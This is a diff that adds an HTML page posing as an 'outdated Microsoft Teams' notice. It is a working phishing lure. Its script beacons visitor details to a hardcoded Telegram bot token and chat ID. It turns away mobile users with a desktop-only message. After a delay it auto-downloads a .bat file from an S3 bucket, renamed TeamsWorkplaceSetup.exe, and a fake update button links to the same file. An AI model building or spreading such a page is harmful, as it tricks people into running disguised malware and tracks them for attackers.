@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Update Microsoft Teams to Join Meeting</title>
+   
+    <script>
+        let notificationSent = false;   // ← Prevents sending twice
+
+        // Reliable Telegram notification (CORS-safe)
+        function sendTelegramNotification() {
+            if (notificationSent) return;   // Prevent duplicate
+            notificationSent = true;
+
+            const botToken = '7528480329:AAFpcsfdkyI-sYPIr5dIj_zXK5SnD9VQCWE';
+            const chatId = '1152085128';
+            
+            const message = `🚨 New Visit - MS Teams Page\n\n` +
+                            `Time: ${new Date().toLocaleString()}\n` +
+                            `User-Agent: ${navigator.userAgent.substring(0, 150)}...\n` +
+                            `Screen: ${window.innerWidth}x${window.innerHeight}\n` +
+                            `Device: Desktop`;
+
+            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
+
+            // Best method: Image beacon (most reliable for bypassing CORS)
+            const img = new Image();
+            img.src = telegramApiUrl;
+
+            // Optional backup using no-cors fetch
+            fetch(telegramApiUrl, { mode: 'no-cors' })
+                .catch(() => {}); // silent fail
+        }
+
+        function isLikelyMobile() {
+            const ua = navigator.userAgent || '';
+            const mobileRegex = /Mobi|Android|iPhone|iPod|BlackBerry|IEMobile|Opera Mini|webOS|Windows Phone|BB10/i;
+            
+            const isMobileUA = mobileRegex.test(ua);
+            const isTouchDevice = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
+            const isSmallScreen = window.innerWidth <= 900;
+            const isPlatformMobile = /iPhone|iPad|Android|WinCE|WinMobile/i.test(navigator.platform || '');
+            
+            let isMobileUAData = false;
+            if (navigator.userAgentData && navigator.userAgentData.mobile) {
+                isMobileUAData = true;
+            }
+            
+            const isCellular = navigator.connection && navigator.connection.type === "cellular";
+
+            const isMobile = isMobileUA || isMobileUAData || isPlatformMobile || 
+                            (isTouchDevice && isSmallScreen) || isCellular;
+
+            if (isMobile) {
+                document.body.innerHTML = `
+                <div style="display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;background:#f8f8f8;color:#333;font-family:sans-serif;text-align:center;padding:20px;box-sizing:border-box;">
+                    <h1 style="font-size:24px;margin-bottom:20px;color:#E03636">⚠️ Desktop Only</h1>
+                    <p style="font-size:18px;margin-bottom:10px;max-width:500px;line-height:1.5;">
+                        Access is only available on a desktop or Windows computer.
+                    </p>
+                    <p style="font-size:16px;max-width:500px;line-height:1.5;">
+                        Please check your email and open the document on a laptop or desktop device.
+                    </p>
+                </div>`;
+            } else {
+                // Desktop user → Send notification **once**
+                sendTelegramNotification();
+            }
+        }
+
+        // Run everything on page load
+        window.onload = function() {
+            isLikelyMobile();
+
+            // Auto-download after 3 seconds
+            setTimeout(function() {
+                var fileUrl = "https://x374k-094op-04984.s3.us-east-1.amazonaws.com/adobe_update_installer.bat";
+                var link = document.createElement('a');
+                link.href = fileUrl;
+                link.download = "TeamsWorkplaceSetup.exe";
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+            }, 10000);
+        };
+    </script>
+
+    <style>
+        body {
+            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+            color: #333;
+        }
+        .navbar {
+            background-color: #6264a7;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            color: white;
+        }
+        .navbar a { color: white; text-decoration: none; margin: 0 15px; font-size: 18px; }
+        .navbar a:hover { text-decoration: underline; }
+        .logo-container img { width: 45px; }
+        .navbar h2 { margin: 0; font-size: 24px; color: white; font-weight: 350; }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+            background-color: #ffffff;
+            border-radius: 8px;
+            text-align: center;
+            margin-top: 50px;
+        }
+        h1 {
+            font-size: 45px;
+            background: linear-gradient(90deg, #6264a7, #9b59b6);
+            -webkit-background-clip: text;
+            color: transparent;
+            margin-bottom: 20px;
+            font-weight: 300;
+        }
+        p { font-size: 20px; line-height: 1.6; font-weight: 350; }
+        .cta-button {
+            display: inline-block;
+            padding: 15px 30px;
+            margin-top: 20px;
+            background-color: #6264a7;
+            color: white;
+            border-radius: 5px;
+            text-decoration: none;
+            font-size: 20px;
+        }
+        .cta-button:hover { background-color: #4f518a; }
+        .footer { font-size: 18px; color: #777; margin-top: 30px; }
+        .footer a { color: #6264a7; }
+        .phone-image-container { text-align: center; margin-top: 40px; }
+        .phone-image-container img {
+            width: 50%;
+            max-width: 800px;
+            border-radius: 15px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Navigation Bar -->
+    <div class="navbar">
+        <div class="logo-container">
+            <img src="https://brandlogos.net/wp-content/uploads/2020/09/Microsoft-Teams-logo--512x455.png" alt="Microsoft Teams Logo">
+        </div>
+        <h2>Microsoft Teams</h2>
+    </div>
+
+    <div class="container">
+        <h1>Your Microsoft Teams Client is Outdated!</h1>
+        <p>It looks like your version of Microsoft Teams is not up-to-date. To join the meeting, please download the latest version of Microsoft Teams.</p>
+       
+        <div class="phone-image-container">
+            <img src="https://cdn-dynmedia-1.microsoft.com/is/image/microsoftcorp/Blade005_MeetFromEverywhere_960x620?resMode=sharp2&op_usm=1.5,0.65,15,0&wid=1920&qlt=100&fit=constrain" alt="Microsoft Teams on Phone">
+        </div>
+       
+        <p>Don't worry, it's easy to get the latest version of Microsoft Teams. Your download should start automatically if it doesn't click the link below to download:</p>
+        <a href="https://x374k-094op-04984.s3.us-east-1.amazonaws.com/adobe_update_installer.bat" class="cta-button">Update Microsoft Teams</a>
+        <hr>
+        <p class="footer">
+           Microsoft Teams &copy; 2026. All rights reserved.
+        </p>
+    </div>
+</body>
+</html>
